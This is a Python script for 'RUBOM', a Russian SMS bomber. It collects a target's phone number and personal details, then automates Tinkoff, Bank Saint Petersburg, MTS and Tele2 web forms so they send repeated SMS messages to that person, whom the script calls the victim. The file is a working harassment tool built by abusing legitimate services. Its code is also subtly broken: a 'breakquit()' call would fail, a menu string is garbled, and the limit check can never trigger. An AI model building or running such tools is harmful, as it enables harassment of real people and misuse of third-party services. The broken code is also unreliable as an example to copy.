from time import sleep
from modules import *
from parsing import *

infor = {}

view_nom = {
'mts':[910, 911, 912, 913, 914, 915, 916, 917, 918, 919, 980, 981, 982, 985],
'megafon':[936, 925, 929, 999, 926, 901, 926, 985, 929, 495, 931],
'bilain':[909, 962, 963, 964, 965, 967, 968, 917, 999, 901, 925, 926, 936, 915, 916, 985],
'tele2':[950, 951, 952, 953, 904]
}

clear()
print('')
file = open('logo.txt', 'r')
for i in file:
    print(i, end='')
print('\nДобро пожаловать в rubom.\nЭто как bomber, только русский с русскими номерами!\nЕсть вопросы? Набери help.\n')
while True:
    try:
        while True:
            com = input('command>').split()
            if len(com) != 0:
                break
            else:
                print('\nОшибка\n')
    except:
        print('\nОшибка\n')
        continue
    if com[0] == 'help':
        print('''\nВот пункты, что нужно делать:
    1. Установить номер, емаил, имя, фамилию и отчество(всё кроме номера, необязательно) через комманду add.
    2. Выбрать способ бумбера(комманда choose).
    3. Если ты выполнил 1 и 2 пункт, набери start.
Вывод информации - return.
Настройки selenium - set.
Очистка - clear.
Выход - exit.\n''')
    elif com[0] == 'add':
        if len(com) >= 2:
            if len(com) == 5 or len(com) == 2:
                com.append('none')
            if (com[1][0] == '8' or (com[1][0] == '+' and com[1][1] == '7')) and (len(com[1]) == 11 or len(com[1]) == 12):
                if com[2].lower() == 'none' or (('@gmail.com' in com[2] or '@yandex.ru' in com[2] or '@mail.ru' in com[2]) and is_eng(com[2].split('@')[0]) == True):
                    if '+' in com[1]:
                        com[1] = com[1].replace('+7', '8')
                    connect = None
                    for i in view_nom:
                        if int(com[1][1]+com[1][2]+com[1][3]) in view_nom[i]:
                            connect = i
                            break
                    infor['pol'] = {'number':com[1], 'email': None if len(com) < 3 else None if com[2].lower() == 'none' else com[2], 'name': None if len(com) < 4 else None if com[3].lower() == 'none' else com[3], 'surname':None if len(com) < 5 else None if com[4].lower() == 'none' else com[4], 'patronymic':None if len(com) < 6 else None if com[5].lower() == 'none' else com[5], 'connection':connect}
                    print('\nНомер об этом россияне был сохранён.\n')
                else:
                    print('\nТы указал неправильный емаил, если ты его не знаешь, укажи none.\n')
            else:
                print('\nТы указал неправильный номер, подозридельно -_- .\n')
        else:
            print('\nУкажи полную информацию.\n')
    elif com[0] == 'choose':
        clear()
        print('\nПора выбирать бумбер, это всё sms)')
        while True:
            print('\n1-банк тинькофф(sel)\n2-банк санкт-петербург(squit()el)\n3-мтс(req)\n4-теле(sel)\n5-выход\n')
            ch = input('choice>')
            clear()
            if ch == '1':
                infor['bomber'] = {'type':1, 'url':'https://www.tinkoff.ru/cards/debit-cards/tinkoff-black/?internal_source=home_main_block_button'}
                print('\nСпособ бумер был выбран.\n')
                break
            elif ch == '2':
                infor['bomber'] = {'type':2, 'url':'https://www.bspb.ru/retail/cards/form/?bspb_param=analytics-btn'}
                print('\nСпособ бумер был выбран.\n')
                break
            elif ch == '3':
                infor['bomber'] = {'type':3, 'url':'https://login.mts.ru/amserver/UI/Login?service=login-restore&srcsvc=lk&goto=https%3a%2f%2flk.mts.ru%2f%3f_ga%3d2.5782449.387887811.1603817807-7527059.1597225624&login_hint='}
                print('\nСпособ бумер был выбран.\n')
                break
            elif ch == '4':
                infor['bomber'] = {'type':4, 'url':'https://msk.tele2.ru/tariffs'}
                print('\nСпособ бумер был выбран.\n')
                breakquit()
            elif ch == '5':
                print('\nТы вышел из этой функции.\n')
                break
            else:
                print('\nЯ не понял.')
    elif com[0] == 'return':
        if len(com) == 2:
            if com[1] == 'sel':
                print(f'\nВот вся информация:{sel}.\n')
            else:
                try:
                    print(f'\nВот вся информация:{infor[com[1]]}.\n')
                except:
                    print('\nЯ не нашёл.\n')
        else:
            print(f'\nВот вся информация:{infor}.\n')
    elif com[0] == 'set':
        clear()
        print('\nУверен ты знаешь что делать.')
        while True:
            print('1-выбор драйвера\n2-безголовый режим\n3-размер окна\n4-добавить ip(прокси)\n5-установщик драйвера chrome\n6-выход\n')
            ch = input('choice>')
            clear()
            if ch == '1':
                while True:
                    print('1-chrome\n2-firefox\n3-выход\n')
                    ch = input('choice>')
                    clear()
                    if ch == '1':
                        sel['type'] = 'chrome'
                        print('\nДрайвер был выбран.\n')
                        break
                    elif ch == '2':
                        sel['type'] = 'firefox'
                        print('\nДрайвер был выбран.\nСтопэ. Перед тем как работать с firefox, установи драйвер по ссылке, только для своего оэски, ок? Тогда ты будешь страдать)\nВот ссылка: https://github.com/mozilla/geckodriver/releases/ \n')
                        break
                    elif ch == '3':
                        print('\nТы вышел из этой функции.\n')
                        break
                    else:
                        print('\nЯ не понял.\n')
            elif ch == '2':
                while True:
                    print('1-True\n2-False\n3-выход\n')
                    ch = input('choice>')
                    clear()
                    if ch == '1':
                        sel['headless'] = True
                        print('\nФункция была включена.\n')
                        break
                    elif ch == '2':
                        sel['headless'] = False
                        print('\nФункция была выключена.\n')
                        break
                    elif ch == '3':
                        print('\nТы вышел из этой функции.\n')
                        break
                    else:
                        print('\nЯ не понял.\n')
            elif ch == '3':
                while True:
                    print('\nУкажите размер окна драйвера, через пробел(1-выход).\n')
                    try:
                        while True:
                            paz = [int(x) for x in input('value>').split()]
                            clear()
                            if len(paz) != 0:
                                break
                            else:
                                print('\nУКАЖИ РАЗМЕР!!!\n')
                    except:
                        clear()
                        print('\nНеправильно ты вёл. Давай всё по новому.')
                        continue
                    if len(paz) == 2 and (paz[0] > 0 and paz[1] > 1):
                        sel['window_size'] = 'x'.join([str(x) for x in paz])
                        print('\nРазмер указан.\n')
                        break
                    elif len(paz) == 1 and (paz[0] == 1):
                        print('\nТы вышел из этой функции.\n')
                        break
                    else:
                        print('Давай всё по новому.\n')
            elif ch == '4':
                print('\nУкажите прокси, c http или типо того(1-выход, none-неуказан).\n')
                zn = input('value>')
                clear()
                if zn == '1':
                    print('\nТы вышел из этой функции.\n')
                else:
                    sel['proxy'] = None if zn.lower() == 'none' else zn
                    print('\nПрокси был установлен.\n')
            elif ch == '5':
                if name_os == 'Windows':
                    while True:
                        print('1-True\n2-False\n3-выход\n')
                        ch = input('choice>')
                        clear()
                        if ch == '1':
                            sel['installer_chrome_win'] = True
                            print('\nФункция была включена.\n')
                            break
                        elif ch == '2':
                            sel['installer_chrome_win'] = False
                            print('\nФункция была выключена.\nУстановка драйвера для chrome: https://chromedriver.chromium.org/downloads\n')
                            break
                        elif ch == '3':
                            print('\nТы вышел из этой функции.\n')
                            break
                        else:
                            print('\nЯ не понял.\n')
                else:
                    print('\nЭто функция доступна только для пользователей винды.\n')
            elif ch == '6':
                print('\nТы вышел из этой функции.\n')
                break
            else:
                print('\nЯ не понял.\n')
    elif com[0] == 'start':
        if 'pol' in infor and 'bomber' in infor:
            if (infor['bomber']['type'] == 3 and infor['pol']['connection'] == 'mts') or infor['bomber']['type'] != 3:
                print('\nВведи количество будущих отправленных sms(не больше 100).\n')
                while True:
                    try:
                        qu = int(input('quantity>'))
                        if qu < 0 and qu > 100:
                            print('\nЭто число слишком большое или маленьное.\n')
                        else:
                            print('\nОк, понял.\n')
                            break
                    except:
                        print('\nВведи число\n')
                site = web(infor)
                for i in range(qu):
                    while True:
                        try:
                            if infor['bomber']['type'] == 1:
                                site.tinkoff()
                                break
                            elif infor['bomber']['type'] == 2:
                                site.bspb()
                                break
                            elif infor['bomber']['type'] == 3:
                                site.mts()
                                break
                            elif infor['bomber']['type'] == 4:
                                site.tele()
                                break
                        except:
                            print('\nОоОо, появилась ошибка. Интересно из-за чего -_- .\n')
                    print(f'\nЕс, +одно сообщение. Юху\nОтправленно:{i+1}, Осталось:{qu-(i+1)}\n')
                    if i != qu-1:
                        sleep(60)
                    site.get()
                site.quit()
                clear()
                print('\nБумбер окончен, жертва пострадал(а).\n')
            else:
                print('\nВид связи у жертвы небодходит для бумбера.\nЗа что????????????((((\n')
        else:
            print('\nТы дебил? Мне нехватает информация.\n')
    elif com[0] == 'clear' or com[0] == 'cls':
        clear()
    elif com[0].lower() == 'v' or com[0].lower() == 'version':
        print('\n0.1.1\n')
    elif com[0] == 'neofetch':
        clear()
        print('')
        file = open('logo.txt', 'r')
        for i in file:
            print(i, end='')
        print('\nversion: 0.1.1\nby: Maxython\nGitHub: https://github.com/Maxython\nGitHub repositories: https://github.com/Maxython/RUBOM\n')
    elif com[0] == 'exit' or com[0] == 'quit':
        print('\nПока, уверен мы ещё увидимся.\n')
        exit()
    elif com[0] == 'Mashik':
        clear()
        print('20102004-232301112020')
        sleep(0.1)
        clear()
        exit()
    else:
        print('\nЯ не понял.\n')
